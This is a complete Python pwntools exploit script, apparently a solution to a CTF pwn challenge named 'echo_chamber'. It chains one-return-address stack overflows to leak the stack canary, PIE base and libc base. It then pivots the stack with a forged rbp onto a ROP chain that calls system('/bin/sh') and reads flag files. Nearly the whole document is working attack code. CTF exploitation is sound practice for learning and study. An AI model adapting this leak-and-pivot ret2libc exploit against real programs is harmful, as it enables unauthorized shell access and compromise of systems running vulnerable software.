#!/usr/bin/env python3
"""
echo_chamber - CSCTF 2026 pwn (900 pts)

    char buf[0x50];            // at rbp-0x60
    read(0, buf, 0x70);        // 0x70 > 0x50+canary+rbp  -> 8 bytes past the retaddr
    printf("echo: %s\n", buf); // leaks whatever follows buf, in a loop

Full RELRO + PIE + canary, glibc 2.35. The overflow reaches EXACTLY one return
address (buf+0x68 .. buf+0x6f), so no ROP chain fits -- and the binary itself has
only `leave; ret` and `ret`, no `pop rdi`.

The way in: `printf("echo: %s", buf)` loads buf as **rbp-0x60**, and `leave` lets us
choose rbp. So returning to 0x1332 (the echo branch) with a forged rbp both leaks the
memory at rbp-0x60 and drops us back into the read loop with the buffer relocated
wherever we like.

  round A1  leak canary + saved rbp   (overwrite the canary's NUL, %s runs on)
  round A2  leak the return address   (fill through saved rbp)  -> PIE base
  round A3  "bye" + correct canary, rbp := R+0x78, ret := 0x1332
            -> printf leaks [R+0x18] = __libc_start_call_main+0x80  -> libc base
            -> loop continues with buf_B = R+0x18
  round B   "bye" + canary, rbp := buf_B, ret := `leave; ret`
            -> pivots onto a chain inside buf_B: pop rdi; "/bin/sh"; system
"""
import re
import sys
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HERE   = os.path.dirname(os.path.abspath(__file__))
LOCAL  = os.path.join(HERE, "work/echo_chamber_patched")
LIBC   = ELF(os.path.join(HERE, "dist/libc.so.6"), checksec=False)

OFF_CANARY = 0x58
OFF_RBP    = 0x60
OFF_RET    = 0x68

ECHO_BRANCH = 0x1332   # lea -0x60(%rbp),%rax ; printf("echo: %s\n", rbp-0x60) ; jmp loop
LEAVE_RET   = 0x1365
RET         = 0x101a
MAIN_RET    = 0x137e   # chamber's return address inside main -> gives the PIE base

# [chamber_rbp+0x18] is the return address inside __libc_start_call_main. The symbol is
# local, so it is absent from the shipped libc's .dynsym -- offset measured under gdb
# against dist/libc.so.6 (Ubuntu GLIBC 2.35-0ubuntu3.15):
LIBC_RET_OFF = 0x29d90


class Truncated(Exception):
    """a leak got cut short by an unlucky 0x00 -- retry on a fresh connection"""


def rnd(io, payload):
    """one loop iteration: send payload, return what %s echoed back"""
    io.send(payload)
    io.recvuntil(b"echo: ")
    return io.recvuntil(b"\n> ", drop=True)


def attempt(connect):
    io = connect()
    io.recvuntil(b"> ")

    # --- A1: canary + saved rbp -------------------------------------------
    # one byte past the canary's NUL, so %s walks straight through it
    leak = rnd(io, b"A" * (OFF_CANARY + 1))[OFF_CANARY + 1:]
    if len(leak) < 13:
        # a 0x00 inside the canary or the saved rbp cut %s short (~3% of runs)
        io.close()
        raise Truncated("leak A1 is %d bytes, need 13" % len(leak))
    canary = b"\x00" + leak[:7]
    saved_rbp = u64(leak[7:13].ljust(8, b"\x00"))
    R = saved_rbp - 0x10                      # chamber's own rbp
    log.success("canary      = %#x" % u64(canary))
    log.success("chamber rbp = %#x" % R)

    # --- A2: return address -> PIE base ------------------------------------
    leak = rnd(io, b"B" * OFF_RET)[OFF_RET:]
    if len(leak) < 6:
        io.close()
        raise Truncated("leak A2 is %d bytes, need 6" % len(leak))
    pie = u64(leak[:6].ljust(8, b"\x00")) - MAIN_RET
    if pie & 0xfff:
        io.close()
        raise Truncated("PIE base %#x not page aligned" % pie)
    log.success("pie base    = %#x" % pie)

    # --- A3: forge rbp so the echo branch prints the libc pointer ----------
    # [R+0x18] holds the return address inside __libc_start_call_main
    buf_b = R + 0x18
    p = bytearray(b"\x00" * 0x70)
    p[0:4]                     = b"bye\x00"              # leave the loop
    p[OFF_CANARY:OFF_CANARY+8] = canary
    p[OFF_RBP:OFF_RBP+8]       = p64(buf_b + 0x60)       # rbp-0x60 == buf_b
    p[OFF_RET:OFF_RET+8]       = p64(pie + ECHO_BRANCH)
    io.send(bytes(p))

    io.recvuntil(b"echo: ")
    leak = io.recvuntil(b"\n> ", drop=True)
    if len(leak) < 6:
        io.close()
        raise Truncated("libc leak is %d bytes, need 6" % len(leak))
    libc_base = u64(leak[:6].ljust(8, b"\x00")) - LIBC_RET_OFF
    if libc_base & 0xfff:
        io.close()
        raise Truncated("libc base %#x not page aligned" % libc_base)
    LIBC.address = libc_base
    log.success("libc base   = %#x" % LIBC.address)

    # --- B: pivot onto a chain sitting in the relocated buffer -------------
    rop     = ROP(LIBC)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
    ret_gdt = rop.find_gadget(["ret"]).address
    binsh   = next(LIBC.search(b"/bin/sh\x00"))
    system  = LIBC.sym["system"]

    # system must start with rsp % 16 == 8, exactly as a real `call` would leave it
    chain = [pop_rdi, binsh]
    while (buf_b + 0x20 + 8 * (len(chain) - 2)) % 16 != 8:
        chain.append(ret_gdt)
    chain.append(system)
    log.info("chain: %d slots, buf_b = %#x" % (len(chain), buf_b))

    p = bytearray(b"\x00" * 0x70)
    p[0:4] = b"bye\x00"
    p[8:8 + 8 * len(chain)]    = b"".join(p64(x) for x in chain)
    p[OFF_CANARY:OFF_CANARY+8] = canary
    p[OFF_RBP:OFF_RBP+8]       = p64(buf_b)              # leave -> rsp = buf_b
    p[OFF_RET:OFF_RET+8]       = p64(pie + LEAVE_RET)
    io.send(bytes(p))

    sleep(0.3)
    io.sendline(b"cat /flag* /home/*/flag* 2>/dev/null; echo ---; id")
    out = io.recvrepeat(2.0)
    if b"uid=" not in out:
        io.close()
        raise Truncated("no shell on the wire")
    return io, out


def main():
    if len(sys.argv) > 1 and ":" in sys.argv[1]:
        host, port = sys.argv[1].rsplit(":", 1)
        connect = lambda: remote(host, int(port))
    else:
        connect = lambda: process(LOCAL)

    for i in range(4):          # a handful of connections, never a loop
        try:
            io, out = attempt(connect)
            break
        except (Truncated, EOFError) as e:
            log.warning("attempt %d failed: %s" % (i + 1, e))
    else:
        log.failure("no attempt reached a shell")
        return

    print(out.decode(errors="replace"))
    m = re.search(rb"CSCTF\{[^}]*\}", out)
    if m:
        log.success("FLAG: " + m.group(0).decode())
    else:
        io.interactive()


if __name__ == "__main__":
    main()
